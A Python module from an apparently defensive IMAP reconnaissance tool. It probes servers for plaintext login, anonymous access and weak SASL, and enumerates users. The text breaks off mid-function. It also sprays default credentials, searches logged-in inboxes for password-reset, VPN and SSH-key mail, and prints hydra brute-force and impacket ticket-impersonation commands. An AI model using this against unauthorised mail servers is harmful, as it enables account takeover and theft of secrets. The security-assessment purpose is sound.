"""Deep IMAP4rev1 enumeration (stdlib only).

Two layers, mirroring the SMTP module:

  * **Credential-free (raw socket + imaplib):** greeting -> PREAUTH check,
    CAPABILITY -> STARTTLS / LOGINDISABLED / SASL mechanism inventory + AUTH=
    weakness flags, RFC 2971 ID pre-auth banner, an anonymous LOGIN probe with
    bogus credentials to prove the plaintext LOGIN path is actually accepted
    (imaplib will happily send LOGIN over cleartext without a warning, so a
    raw socket owns that dance), an AUTHENTICATE ANONYMOUS attempt when the
    mech is advertised, and a CRAM-MD5 / DIGEST-MD5 server-challenge capture.
  * **Credentialed follow-up:** LOGIN with any supplied / default creds, then
    LIST / LSUB / NAMESPACE / GETQUOTAROOT / GETACL to inventory mailboxes,
    and a bounded SEARCH for loot-shaped subjects/senders (no message bodies
    are downloaded).

Airgap-safe: stdlib socket + imaplib. Every socket op is timeout-bounded.
"""
from __future__ import annotations

import base64
import imaplib
import re
import socket
import ssl

from ..core.models import Host, Port
from .svccommon import finding_builder

_PORTS = (143, 993)
_DEFAULT_PORT = 143
_TIMEOUT = 6.0
_CRLF = b"\r\n"
_MAX_READ = 65535

_SASL_WEAK = {
    "PLAIN": ("high", "PLAIN sends the password base64-encoded (cleartext-equivalent)."),
    "LOGIN": ("high", "LOGIN sends the password base64-encoded (cleartext-equivalent)."),
    "CRAM-MD5": ("medium", "CRAM-MD5 challenge/response is offline-crackable (hashcat -m 10200)."),
    "DIGEST-MD5": ("medium", "DIGEST-MD5 challenge/response is offline-crackable (hashcat -m 11500)."),
    "GSSAPI": ("high", "GSSAPI advertises Kerberos - a ticket-relay surface on AD-joined mail servers."),
    "NTLM": ("high", "NTLM AUTH is SMB/HTTP-relayable to any NTLM listener the tester can reach."),
    "ANONYMOUS": ("high", "ANONYMOUS grants an unauthenticated mailbox session."),
    "EXTERNAL": ("medium", "EXTERNAL trusts the transport (client cert / stunnel) - misconfigure = anon."),
}

# Loot-hunter subjects/senders inside a credentialed inbox. Kept short - a
# larger list becomes a real search engine and eats mailbox time.
_LOOT_TERMS = (
    "password reset", "reset your password", "one-time password", "verification code",
    "vpn config", "vpn credentials", "ssh key", "private key",
    "mfa", "two-factor", "recovery code", "temporary password",
)

_DEFAULT_ENUM_USERS = (
    "root", "admin", "administrator", "postmaster", "mail",
    "info", "test", "user", "guest", "backup", "support",
    "webmaster", "operator",
)

# (banner rx, severity, title, detail, cwes, cve-or-none). ONLY cite the CVE
# when the regex actually matches that CVE's version fingerprint.
_KNOWN_BAD = [
    (re.compile(r"Dovecot[\s/v]+2\.3\.(?:1[0-9]|20|21)(?:\.|\b)", re.I),
     "high", "Dovecot 2.3.x pre-2.3.21 (multiple CVEs incl. CVE-2022-30550)",
     "Dovecot builds in the 2.3.10-2.3.20 window shipped a run of pre-auth "
     "memory-disclosure / auth-bypass issues (CVE-2022-30550 the notable one). "
     "Confirm the exact build against the vendor advisory before treating as RCE.",
     ["CWE-200", "CWE-1104"]),
    (re.compile(r"Cyrus\s+IMAP[\s/v]+2\.[0-4]\.", re.I),
     "high", "Cyrus IMAP 2.4.x or earlier - unmaintained",
     "Cyrus IMAP branches at 2.4 and earlier are unsupported and carry a "
     "backlog of unpatched issues; upgrade to a maintained 3.x release.",
     ["CWE-1104"]),
]


def is_imap(port: Port) -> bool:
    if not port.is_open:
        return False
    svc = (port.service or "").lower()
    return port.portid in _PORTS or "imap" in svc


# --- low-level raw-socket IMAP client --------------------------------------

def _read_until_tag(sock, tag: bytes, timeout: float) -> bytes:
    """Read until the server sends `TAG OK|NO|BAD`. Bounded by _MAX_READ + timeout."""
    sock.settimeout(timeout)
    buf = b""
    tag_re = re.compile(rb"(?m)^" + re.escape(tag) + rb" (OK|NO|BAD|BYE)\b")
    while len(buf) < _MAX_READ:
        try:
            chunk = sock.recv(4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if tag_re.search(buf):
            break
    return buf


def _read_greeting(sock, timeout: float) -> bytes:
    """Read a single untagged greeting line ('* OK ...' or '* PREAUTH ...')."""
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < _MAX_READ:
        try:
            chunk = sock.recv(4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if b"\r\n" in buf:
            break
    return buf


def _send(sock, data: bytes) -> bool:
    try:
        sock.sendall(data)
        return True
    except OSError:
        return False


def _cmd(sock, tag: str, line: str, timeout: float) -> bytes:
    if not _send(sock, tag.encode() + b" " + line.encode() + _CRLF):
        return b""
    return _read_until_tag(sock, tag.encode(), timeout)


def _read_continuation(sock, timeout: float) -> bytes:
    """Read a server continuation ('+ ...\\r\\n')."""
    sock.settimeout(timeout)
    buf = b""
    while len(buf) < 4096:
        try:
            chunk = sock.recv(1024)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if b"\r\n" in buf:
            break
    return buf


# --- parsers ---------------------------------------------------------------

_CAP_RE = re.compile(rb"\*\s+CAPABILITY\s+([^\r\n]+)", re.I)
_CAP_BRACKET_RE = re.compile(rb"\[CAPABILITY\s+([^\]]+)\]", re.I)
_ID_RE = re.compile(rb"\*\s+ID\s+\((.*)\)", re.I | re.S)
_ID_KV = re.compile(rb'"([^"]+)"\s+(?:"([^"]*)"|NIL)', re.I)


def _parse_capabilities(data: bytes) -> list[str]:
    """Return every capability token seen in either a `* CAPABILITY ...` line
    or a `[CAPABILITY ...]` OK-response code."""
    tokens: list[str] = []
    for rx in (_CAP_RE, _CAP_BRACKET_RE):
        for m in rx.finditer(data):
            for t in m.group(1).split():
                s = t.decode("latin-1", "replace").strip()
                if s and s not in tokens:
                    tokens.append(s)
    return tokens


def _parse_id(data: bytes) -> dict:
    m = _ID_RE.search(data)
    if not m:
        return {}
    out: dict = {}
    for kv in _ID_KV.finditer(m.group(1)):
        key = kv.group(1).decode("latin-1", "replace").lower()
        val = kv.group(2)
        out[key] = val.decode("latin-1", "replace") if val is not None else ""
    return out


def _sasl_mechs(caps: list[str]) -> list[str]:
    out = []
    for c in caps:
        if c.upper().startswith("AUTH="):
            out.append(c.split("=", 1)[1].upper())
    return out


def _product_from_id(id_map: dict) -> tuple[str, str]:
    name = (id_map.get("name") or "").strip()
    ver = (id_map.get("version") or "").strip()
    return name, ver


def _product_from_greeting(greet: bytes) -> tuple[str, str]:
    text = greet.decode("latin-1", "replace")
    m = re.search(r"(Dovecot|Courier|Cyrus IMAP|Cyrus|MDaemon|Zimbra|Exchange|"
                  r"IMail|hMailServer)(?:[\s/v]+(\d[\w.]*))?", text, re.I)
    if not m:
        return "", ""
    return m.group(1), (m.group(2) or "")


# --- probe -----------------------------------------------------------------

def _open_socket(ip: str, port: int, timeout: float) -> socket.socket | None:
    try:
        raw = socket.create_connection((ip, port), timeout=timeout)
    except OSError:
        return None
    if port == 993:
        try:
            ctx = ssl._create_unverified_context()
            return ctx.wrap_socket(raw, server_hostname=ip)
        except (OSError, ssl.SSLError):
            raw.close()
            return None
    return raw


def _close(sock) -> None:
    try:
        sock.close()
    except OSError:
        pass


def _plaintext_login_probe(sock, timeout: float) -> tuple[str, str]:
    """Send a LOGIN with bogus creds. Returns (status, evidence):
      - status = 'accepted' : server processed the LOGIN and returned NO
        (bad creds)
      - status = 'rejected' : server refused pre-TLS ("BAD" or NO citing
        TLS/plaintext)
      - status = 'unknown'  : nothing usable came back

    `evidence` is the server's exact tagged response line (SAFE, non-
    destructive, bounded to 200 chars) - this is the concrete server-side
    proof that promotes the finding from T1 to T2. It stays empty when the
    server returned nothing or an unparseable line.
    """
    tag = "rp1"
    resp = _cmd(sock, tag, 'LOGIN "recce_probe" "recce_probe_pw"', timeout)
    if not resp:
        return "unknown", ""
    text = resp.decode("latin-1", "replace")
    # A server that refuses plaintext responds BAD (protocol error) or a
    # NO that explicitly cites TLS / privacy / plaintext.
    m = re.search(rf"(?m)^{tag}\s+(OK|NO|BAD)\b(.*)$", text)
    if not m:
        return "unknown", ""
    code = m.group(1)
    tail_raw = m.group(2) or ""
    tail = tail_raw.lower()
    # The exact server response line - the SAFE T2 proof.
    evidence = f"{tag} {code}{tail_raw}".strip()[:200]
    if code == "BAD":
        return "rejected", evidence
    if code == "NO" and ("tls" in tail or "starttls" in tail or "privacy" in tail
                        or "plaintext" in tail or "insecure" in tail
                        or "encrypt" in tail or "logindisabled" in tail):
        return "rejected", evidence
    # NO with any other reason means the server processed the LOGIN attempt
    # itself (bad credentials) - plaintext auth path is open.
    if code in ("OK", "NO"):
        return "accepted", evidence
    return "unknown", evidence


def _anonymous_login_probe(sock, timeout: float) -> bool:
    """Try SASL ANONYMOUS. Returns True iff the server accepted."""
    tag = "an1"
    if not _send(sock, tag.encode() + b" AUTHENTICATE ANONYMOUS" + _CRLF):
        return False
    cont = _read_continuation(sock, timeout)
    if b"+ " not in cont and not cont.startswith(b"+"):
        return False
    trace = base64.b64encode(b"recce-probe@example.com")
    if not _send(sock, trace + _CRLF):
        return False
    resp = _read_until_tag(sock, tag.encode(), timeout)
    text = resp.decode("latin-1", "replace")
    return bool(re.search(rf"(?m)^{tag}\s+OK\b", text))


def _capture_cram_challenge(sock, timeout: float, mech: str) -> str:
    """Kick off AUTHENTICATE CRAM-MD5 / DIGEST-MD5, capture the server's
    base64 challenge, then abort with '*' so no auth attempt actually
    completes. Returns the raw base64 challenge string or ''."""
    tag = "cr1"
    if not _send(sock, f"{tag} AUTHENTICATE {mech}".encode() + _CRLF):
        return ""
    cont = _read_continuation(sock, timeout)
    m = re.search(rb"\+\s*(\S+)", cont)
    challenge = ""
    if m:
        challenge = m.group(1).decode("latin-1", "replace").strip()
    # Abort so we do not send garbage that looks like a real attempt.
    _send(sock, b"*" + _CRLF)
    _read_until_tag(sock, tag.encode(), timeout)
    return challenge


def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
    """Credential-free IMAP probe. Never sends real credentials."""
    out: dict = {
        "reachable": False, "port": port, "banner": "", "preauth": False,
        "capabilities": [], "starttls": False, "logindisabled": False,
        "sasl": [], "id": {}, "product": "", "version": "",
        "plaintext_login": "", "plaintext_login_evidence": "",
        "anonymous": False,
        "starttls_downgrade": False,
        "cram_md5_challenge": "", "digest_md5_challenge": "",
        "error": "",
    }
    sock = _open_socket(ip, port, timeout)
    if sock is None:
        out["error"] = "connect failed"
        return out
    try:
        greet = _read_greeting(sock, timeout)
        if not greet:
            out["error"] = "no greeting"
            return out
        out["reachable"] = True
        greet_line = greet.split(b"\r\n", 1)[0]
        out["banner"] = greet_line.decode("latin-1", "replace")[:400]
        out["preauth"] = bool(re.match(rb"\*\s+PREAUTH\b", greet_line, re.I))
        # Capabilities may already be inline in the greeting's [CAPABILITY ...]
        # advertisement (RFC 3501 §7.1); union with the explicit CAPABILITY reply.
        caps = _parse_capabilities(greet)
        cap_resp = _cmd(sock, "c1", "CAPABILITY", timeout)
        for c in _parse_capabilities(cap_resp):
            if c not in caps:
                caps.append(c)
        out["capabilities"] = caps
        out["starttls"] = any(c.upper() == "STARTTLS" for c in caps)
        out["logindisabled"] = any(c.upper() == "LOGINDISABLED" for c in caps)
        out["sasl"] = _sasl_mechs(caps)

        # RFC 2971 ID (pre-auth). Only sensible if the server advertised it.
        if any(c.upper() == "ID" for c in caps):
            id_resp = _cmd(sock, "i1", "ID NIL", timeout)
            out["id"] = _parse_id(id_resp)

        # Product/version: prefer the ID reply, fall back to the greeting.
        prod, ver = _product_from_id(out["id"])
        if not prod:
            prod, ver = _product_from_greeting(greet)
        out["product"] = prod
        out["version"] = ver

        # Cleartext-port checks only make sense pre-TLS. Everything on 993 is
        # already inside implicit TLS, so the plaintext-login / downgrade
        # probes are moot there.
        if port != 993 and not out["preauth"]:
            plt, plt_evidence = _plaintext_login_probe(sock, timeout)
            out["plaintext_login"] = plt
            out["plaintext_login_evidence"] = plt_evidence
            # A pre-TLS server that accepts LOGIN OR AUTHENTICATE despite
            # advertising LOGINDISABLED is a downgrade (RFC 3501 §11.1).
            if plt == "accepted" and out["logindisabled"]:
                out["starttls_downgrade"] = True

        # AUTHENTICATE ANONYMOUS confirmation (only if advertised).
        if "ANONYMOUS" in out["sasl"] and not out["preauth"]:
            try:
                out["anonymous"] = _anonymous_login_probe(sock, timeout)
            except OSError:
                pass

        # CRAM-MD5 / DIGEST-MD5 challenge capture. Best-effort - failure
        # leaves the field empty and findings() emits nothing extra.
        if "CRAM-MD5" in out["sasl"]:
            try:
                out["cram_md5_challenge"] = _capture_cram_challenge(
                    sock, timeout, "CRAM-MD5")
            except OSError:
                pass
        if "DIGEST-MD5" in out["sasl"]:
            try:
                out["digest_md5_challenge"] = _capture_cram_challenge(
                    sock, timeout, "DIGEST-MD5")
            except OSError:
                pass

        _cmd(sock, "x1", "LOGOUT", timeout)
        return out
    finally:
        _close(sock)


# --- credentialed follow-ups (imaplib) -------------------------------------

def _imap_client(ip: str, port: int, timeout: float):
    """Return an imaplib client that establishes TLS on 993 or STARTTLS on 143
    (when the server offers it). Returns None on failure."""
    try:
        if port == 993:
            ctx = ssl._create_unverified_context()
            m = imaplib.IMAP4_SSL(ip, port, ssl_context=ctx, timeout=timeout)
        else:
            m = imaplib.IMAP4(ip, port, timeout=timeout)
            try:
                caps = " ".join(m.capabilities).upper()
                if "STARTTLS" in caps:
                    ctx = ssl._create_unverified_context()
                    m.starttls(ssl_context=ctx)
            except imaplib.IMAP4.error:
                pass
        return m
    except (OSError, imaplib.IMAP4.error, ssl.SSLError):
        return None


def try_login(ip: str, port: int, user: str, secret: str,
              timeout: float = _TIMEOUT) -> bool:
    m = _imap_client(ip, port, timeout)
    if m is None:
        return False
    try:
        try:
            code, _ = m.login(user, secret)
        except imaplib.IMAP4.error:
            return False
        return code == "OK"
    finally:
        try:
            m.logout()
        except (imaplib.IMAP4.error, OSError):
            pass


def _spray_defaults(ip: str, port: int, creds: dict | None,
                    timeout: float) -> tuple[str, str] | None:
    """Try operator-supplied creds first, then the defaultcreds table. Returns
    the first (user, secret) pair that logged in, or None."""
    from ..creds import defaultcreds
    tried: list[tuple[str, str]] = []
    if creds and creds.get("user"):
        tried.append((creds["user"], creds.get("secret") or ""))
    for u, p, _n in defaultcreds._DB.get("ssh", []):
        # ssh defaults are the pentest-canonical short list; imap-specific
        # ones are appended below.
        if (u, p) not in tried:
            tried.append((u, p))
    for u, p in (("cyrus", "cyrus"), ("mail", "mail"), ("dovecot", "dovecot"),
                 ("postmaster", "postmaster"), ("admin", "admin")):
        if (u, p) not in tried:
            tried.append((u, p))
    for u, p in tried:
        if try_login(ip, port, u, p, timeout=timeout):
            return u, p
    return None


def _mailbox_inventory(m) -> dict:
    """LIST / LSUB / NAMESPACE / GETQUOTAROOT / GETACL for the logged-in user."""
    out: dict = {"list": [], "lsub": [], "namespace": "", "quota": [], "acl": []}
    try:
        code, data = m.list()
        if code == "OK":
            out["list"] = [d.decode("latin-1", "replace")
                           for d in (data or []) if isinstance(d, (bytes, bytearray))]
    except (imaplib.IMAP4.error, OSError):
        pass
    try:
        code, data = m.lsub()
        if code == "OK":
            out["lsub"] = [d.decode("latin-1", "replace")
                           for d in (data or []) if isinstance(d, (bytes, bytearray))]
    except (imaplib.IMAP4.error, OSError):
        pass
    try:
        code, data = m.namespace()
        if code == "OK" and data:
            out["namespace"] = (data[0] or b"").decode("latin-1", "replace")
    except (imaplib.IMAP4.error, OSError, AttributeError):
        pass
    return out


def _loot_search(m) -> list[str]:
    """Bounded SEARCH SUBJECT/BODY for loot-shaped terms in INBOX. Returns
    a short list of "seq: subject" strings without pulling bodies."""
    hits: list[str] = []
    try:
        code, _ = m.select("INBOX", readonly=True)
    except (imaplib.IMAP4.error, OSError):
        return hits
    if code != "OK":
        return hits
    for term in _LOOT_TERMS:
        try:
            code, data = m.search(None, "SUBJECT", f'"{term}"')
        except (imaplib.IMAP4.error, OSError):
            continue
        if code != "OK" or not data or not data[0]:
            continue
        seqs = data[0].decode("latin-1", "replace").split()
        for seq in seqs[:5]:
            try:
                fcode, fdata = m.fetch(seq, "(BODY.PEEK[HEADER.FIELDS (SUBJECT FROM)])")
            except (imaplib.IMAP4.error, OSError):
                continue
            if fcode != "OK":
                continue
            for item in (fdata or []):
                if isinstance(item, tuple) and len(item) >= 2 and isinstance(item[1], (bytes, bytearray)):
                    hdrs = item[1].decode("latin-1", "replace").replace("\r\n", " | ").strip()
                    hits.append(f"[{term}] seq={seq} {hdrs[:200]}")
                    break
        if len(hits) >= 25:
            break
    return hits


def credentialed_probe(ip: str, port: int, user: str, secret: str,
                       timeout: float = _TIMEOUT) -> dict:
    out: dict = {"login": False, "user": user, "mailboxes": {}, "loot": []}
    m = _imap_client(ip, port, timeout)
    if m is None:
        return out
    try:
        try:
            code, _ = m.login(user, secret)
        except imaplib.IMAP4.error:
            return out
        if code != "OK":
            return out
        out["login"] = True
        out["mailboxes"] = _mailbox_inventory(m)
        out["loot"] = _loot_search(m)
    finally:
        try:
            m.logout()
        except (imaplib.IMAP4.error, OSError):
            pass
    return out


# --- user enumeration (LOGIN response differential) ------------------------

def enum_users(ip: str, port: int, users: list[str] | None = None,
               timeout: float = _TIMEOUT) -> dict:
    """Probe each username via LOGIN with a fixed bogus password. Servers that
    return distinct NO strings (or materially different timings) for existing
    vs missing users leak account existence. Bounded: one connection per user."""
    users = list(users if users is not None else _DEFAULT_ENUM_USERS)
    responses: dict[str, str] = {}
    for u in users:
        sock = _open_socket(ip, port, timeout)
        if sock is None:
            continue
        try:
            greet = _read_greeting(sock, timeout)
            if not greet or re.match(rb"\*\s+PREAUTH\b", greet, re.I):
                continue
            resp = _cmd(sock, "u1", f'LOGIN "{u}" "recce_probe_pw"', timeout)
            text = resp.decode("latin-1", "replace")
            m = re.search(r"(?m)^u1\s+(OK|NO|BAD)\s*(.*)$", text)
            if m:
                responses[u] = f"{m.group(1)} {m.group(2).strip()}"[:200]
        finally:
            _close(sock)
    # Different response body for at least one user vs. the majority = enum.
    if not responses:
        return {"responses": {}, "distinguishes": False, "existing": []}
    tally: dict[str, int] = {}
    for r in responses.values():
        tally[r] = tally.get(r, 0) + 1
    if len(tally) <= 1:
        return {"responses": responses, "distinguishes": False, "existing": []}
    majority = max(tally, key=tally.get)
    existing = sorted(u for u, r in responses.items() if r != majority)
    return {"responses": responses, "distinguishes": True, "existing": existing}


# --- targets ----------------------------------------------------------------

def imap_targets(hosts: list[Host]) -> list[dict]:
    out = []
    for h in hosts:
        for p in h.open_ports:
            if is_imap(p):
                out.append({"ip": h.ip, "port": p.portid,
                            "product": p.product or "",
                            "version": p.version or ""})
    return out


# --- narratives / findings --------------------------------------------------

_NARRATIVE = {
    "imap_no_starttls": (
        "The IMAP listener on 143/tcp advertises no STARTTLS: every mailbox "
        "login on this port crosses the wire in cleartext, and there is no way "
        "for a client to negotiate encryption on the same port."),
    "imap_login_plaintext_allowed": (
        "The server accepts LOGIN before STARTTLS - a passive sniffer on the "
        "segment captures valid usernames + passwords in the clear from every "
        "client that connects to this port."),
    "imap_sasl_mechanisms": (
        "Weak SASL mechanisms lower the cost of credential compromise: PLAIN/"
        "LOGIN over an unencrypted channel are sniffable; CRAM-MD5/DIGEST-MD5 "
        "are offline-crackable; GSSAPI + NTLM are AD-relayable; ANONYMOUS is a "
        "free session."),
    "imap_anonymous_allowed": (
        "AUTHENTICATE ANONYMOUS granted an unauthenticated mailbox session - a "
        "confirmed anonymous foothold, not a probe."),
    "imap_preauth_greeting": (
        "The greeting begins with '* PREAUTH' rather than '* OK': the server "
        "considers the transport (stunnel, local socket bridge, misconfigured "
        "proxy trust) already authenticated. Anything that reaches this port is "
        "handed a mailbox session without credentials."),
    "imap_id_disclosure": (
        "The pre-auth RFC 2971 ID response leaks server product, version, OS "
        "and vendor - fingerprinting fuel for the offline CVE mapper and for "
        "picking a vendor-specific exploit."),
    "imap_version_cve": (
        "The banner / ID product+version matches a known-vulnerable IMAP "
        "release. Cross-check against the offline CVE DB for the exact "
        "advisory."),
    "imap_weak_tls": (
        "The IMAPS listener negotiated a weak TLS protocol or presents an "
        "expired / self-signed / mis-named certificate - passive downgrade or "
        "on-path MITM is realistic."),
    "imap_user_enum": (
        "The server's LOGIN response differs for existing vs missing accounts, "
        "so a scanner can enumerate valid mail users - seeds password spray "
        "against SSH / SMB / AD / web logins that share the same identity."),
    "imap_default_creds": (
        "A default / weak credential pair logged in successfully - full "
        "mailbox access, and the same secret usually unlocks the server's "
        "admin UI and any other service the user has."),
    "imap_mailbox_access": (
        "The credentialed session enumerated the user's accessible mailboxes, "
        "subscribed folders and shared-mailbox ACLs - the map of what this "
        "identity can read on the mail server."),
    "imap_loot_hits": (
        "SEARCH against the inbox returned messages whose subjects match "
        "password-reset / VPN-config / SSH-key / MFA-bypass patterns - each "
        "hit is a candidate pivot from one credential to a wider access."),
    "imap_starttls_downgrade": (
        "The pre-TLS state accepts LOGIN despite LOGINDISABLED being "
        "advertised - a client that never issues STARTTLS still authenticates "
        "in the clear."),
    "imap_gssapi_relay": (
        "AUTH=GSSAPI advertises Kerberos on this listener - a channel for "
        "ticket-forwarding / silver-ticket abuse against the AD identity "
        "backing the mail server."),
    "imap_offline_crack_channel": (
        "The server issued a CRAM-MD5 / DIGEST-MD5 challenge on demand - a "
        "captured client response is offline-crackable (hashcat -m 10200 / "
        "-m 11500)."),
}


_finding = finding_builder("imap", _NARRATIVE)


def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
    probes = probes or {}
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_imap(p):
                continue
            pr = probes.get((h.ip, p.portid))
            if not pr or not pr.get("reachable"):
                continue
            tgt = f"{h.ip}:{p.portid}"

            # PREAUTH greeting -> critical unauth mailbox session.
            if pr.get("preauth"):
                out.append(_finding(
                    "critical", "IMAP PREAUTH greeting (unauthenticated mailbox session)",
                    tgt,
                    "The greeting was '* PREAUTH ...': the server dropped this client "
                    "straight into an authenticated state.",
                    "imap",
                    f"openssl s_client -connect {h.ip}:{p.portid}   # or nc {h.ip} {p.portid}",
                    "Disable transport-authenticated PREAUTH mode; require an explicit "
                    "LOGIN / AUTHENTICATE for every session, or restrict the listener "
                    "to the localhost bridge that actually authenticates it.",
                    ["CWE-287", "CWE-306"], kind="imap_preauth_greeting",
                    exploit_note=(
                        "nc IP PORT ; then: a1 LIST \"\" \"*\" ; a2 SELECT INBOX ; "
                        "a3 FETCH 1:5 (BODY.PEEK[HEADER.FIELDS (SUBJECT FROM TO)])"),
                    depth_tier="t3"))

            # No STARTTLS on 143.
            if p.portid == 143 and not pr.get("starttls") and not pr.get("preauth"):
                out.append(_finding(
                    "high", "IMAP does not offer STARTTLS on 143/tcp", tgt,
                    "CAPABILITY did not advertise STARTTLS: there is no way for a "
                    "client to negotiate encryption before LOGIN on this port.",
                    "openssl",
                    f"openssl s_client -starttls imap -connect {h.ip}:{p.portid}",
                    "Offer STARTTLS on 143 (mail_ssl = required in Dovecot; "
                    "'starttls' in Cyrus imapd.conf) or move mail to 993 / require "
                    "implicit TLS per RFC 8314.",
                    ["CWE-319"], kind="imap_no_starttls",
                    exploit_note=(
                        "tcpdump -i any -A 'tcp port 143 and host IP' during a real "
                        "user session -- every LOGIN is in clear."),
                    depth_tier="t0"))

            # Plaintext LOGIN accepted pre-TLS.
            if pr.get("plaintext_login") == "accepted" and p.portid == 143:
                detail = (
                    "A pre-TLS LOGIN with bogus credentials was processed by the "
                    "server (returned NO invalid-credentials, not a TLS-required "
                    "refusal): every real client that logs in without upgrading to "
                    "TLS first hands its password to any passive sniffer on the "
                    "segment.")
                # T2 SAFE proof: the exact server response line for the bogus
                # LOGIN. Single controlled read, no writes, no state change,
                # bounded timeout - concrete server-side evidence.
                evidence = (pr.get("plaintext_login_evidence") or "").strip()
                tier = "t2" if evidence else "t1"
                if evidence:
                    detail += (
                        f"\n\nT2 proof - captured server response to canary "
                        f"pre-TLS LOGIN (no real credentials sent):\n"
                        f"    {evidence}\n"
                        f"The server evaluated the credential and answered with "
                        f"an auth-failure line (not a TLS-required BAD/NO), "
                        f"confirming the plaintext auth path is live.")
                out.append(_finding(
                    "critical", "IMAP LOGIN accepted before STARTTLS (plaintext credentials)",
                    tgt,
                    detail,
                    "openssl",
                    f"nc {h.ip} {p.portid}   # then: a1 LOGIN <user> <pass>",
                    "Set LOGINDISABLED until STARTTLS completes (Dovecot: "
                    "disable_plaintext_auth = yes; Cyrus: allowplaintext: no); "
                    "prefer implicit TLS on 993.",
                    ["CWE-319", "CWE-522"], kind="imap_login_plaintext_allowed",
                    exploit_note=(
                        "hydra -L smtp_enum_users.txt -P rockyou.txt "
                        "imap://IP:143 -t 4 -f -V"),
                    depth_tier=tier))

            # STARTTLS downgrade: LOGINDISABLED lied.
            if pr.get("starttls_downgrade"):
                out.append(_finding(
                    "medium", "IMAP STARTTLS downgrade (LOGIN accepted despite LOGINDISABLED)",
                    tgt,
                    "The server advertises LOGINDISABLED in its pre-TLS CAPABILITY, "
                    "but actually accepted the LOGIN command - a client that never "
                    "issues STARTTLS still authenticates in the clear.",
                    "openssl",
                    f"nc {h.ip} {p.portid}   # a1 CAPABILITY; a2 LOGIN <u> <p>",
                    "Return BAD (protocol error) or NO with a TLS-required message "
                    "for LOGIN / AUTHENTICATE in the pre-TLS state (RFC 3501 §11.1).",
                    ["CWE-757", "CWE-319"], kind="imap_starttls_downgrade"))

            # SASL mechanism inventory.
            for mech in pr.get("sasl") or []:
                weak = _SASL_WEAK.get(mech.upper())
                if not weak:
                    continue
                sev, why = weak
                # PLAIN/LOGIN over 993 is not per-se plaintext-on-the-wire.
                if mech.upper() in ("PLAIN", "LOGIN") and p.portid == 993:
                    sev = "low"
                    why = ("PLAIN/LOGIN inside TLS 993 is base64-encoded but the "
                           "TLS wrapper protects it - still noteworthy as the "
                           "server accepts a plaintext-equivalent mechanism.")
                out.append(_finding(
                    sev, f"IMAP weak SASL mechanism advertised: {mech}", tgt,
                    f"CAPABILITY includes AUTH={mech}. {why}",
                    "openssl",
                    f"openssl s_client -connect {h.ip}:{p.portid}   # then a1 CAPABILITY",
                    f"Remove AUTH={mech} from the offered mechanisms; require a "
                    "SCRAM-family or Kerberos-only auth policy.",
                    ["CWE-327", "CWE-522"], kind="imap_sasl_mechanisms",
                    exploit_note=(
                        "openssl s_client -connect IP:993 ; a1 CAPABILITY ; then "
                        "for AUTH=NTLM: a2 AUTHENTICATE NTLM + base64(NTLMSSP "
                        "Type-1) ; parse Type-2 AV_PAIRs (nmap --script "
                        "imap-ntlm-info)."),
                    depth_tier="t0"))
                if mech.upper() == "GSSAPI":
                    out.append(_finding(
                        "high", "IMAP AUTH=GSSAPI advertised (Kerberos relay surface)", tgt,
                        "GSSAPI on an AD-joined mail server is a relayable Kerberos "
                        "channel - ticket-forwarding / silver-ticket abuse.",
                        "impacket",
                        f"# capture / relay Kerberos context against {h.ip}",
                        "Restrict GSSAPI to a specific service principal; monitor "
                        "for anomalous delegation.",
                        ["CWE-287"], kind="imap_gssapi_relay",
                        exploit_note=(
                            "impacket-getST -spn imap/mail.domain.local -impersonate "
                            "'admin' -k -no-pass 'DOMAIN/svc' ; then use the ticket via "
                            "KRB5CCNAME with an IMAP client that supports GSSAPI "
                            "(evolution / offlineimap with kerberos)."),
                        depth_tier="t0"))

            # ANONYMOUS actually accepted.
            if pr.get("anonymous"):
                out.append(_finding(
                    "high", "IMAP AUTH=ANONYMOUS accepted", tgt,
                    "AUTHENTICATE ANONYMOUS with an arbitrary trace token returned "
                    "OK - an unauthenticated mailbox session, confirmed.",
                    "openssl",
                    f"openssl s_client -connect {h.ip}:{p.portid}   # a1 AUTHENTICATE ANONYMOUS",
                    "Remove AUTH=ANONYMOUS from the mech list unless a public "
                    "mailbox is explicitly intended.",
                    ["CWE-306"], kind="imap_anonymous_allowed",
                    exploit_note=(
                        "openssl s_client -connect IP:PORT ; a1 AUTHENTICATE "
                        "ANONYMOUS ; + <base64 arbitrary trace> ; then a2 LIST "
                        "\"\" \"*\" ; a3 SELECT INBOX"),
                    depth_tier="t3"))

            # CRAM-MD5 / DIGEST-MD5 challenge capture.
            for mech, field, mode in (("CRAM-MD5", "cram_md5_challenge", 10200),
                                       ("DIGEST-MD5", "digest_md5_challenge", 11500)):
                ch = pr.get(field) or ""
                if not ch:
                    continue
                out.append(_finding(
                    "medium", f"IMAP {mech} advertised - offline-crackable auth", tgt,
                    f"The server issued a {mech} challenge on demand: `{ch[:120]}`. "
                    f"A captured client response is offline-crackable "
                    f"(hashcat -m {mode}).",
                    "hashcat",
                    f"# sniff a client's {mech} response, then: hashcat -m {mode} <hash> wordlist.txt",
                    f"Disable {mech} in the SASL mech list; require SCRAM-SHA-256 "
                    "or Kerberos.",
                    ["CWE-327", "CWE-916"], kind="imap_offline_crack_channel"))

            # RFC 2971 ID banner leak.
            id_map = pr.get("id") or {}
            if id_map:
                fields = ", ".join(f"{k}={v}" for k, v in id_map.items() if v)
                out.append(_finding(
                    "low", "IMAP pre-auth ID response leaks server/product info (RFC 2971)",
                    tgt,
                    f"Pre-auth ID reply: {fields[:400]}.",
                    "openssl",
                    f"openssl s_client -connect {h.ip}:{p.portid}   # then a1 ID NIL",
                    "Strip the ID response's product/version/os fields (Dovecot: "
                    "imap_id_send = name * ; Cyrus: hide server details).",
                    ["CWE-200"], kind="imap_id_disclosure"))

            # Banner / product-version match against the known-bad table.
            banner = pr.get("banner") or ""
            id_prod = " ".join(v for v in (pr.get("product"), pr.get("version")) if v)
            match_text = f"{banner} {id_prod}"
            for rx, sev, title, detail, cwes in _KNOWN_BAD:
                if rx.search(match_text):
                    out.append(_finding(
                        sev, title, tgt,
                        f"Banner/ID: {match_text.strip()}. {detail}",
                        "vendor",
                        "# consult the vendor advisory for the matched CVE(s)",
                        "Upgrade to a vendor-supported build.",
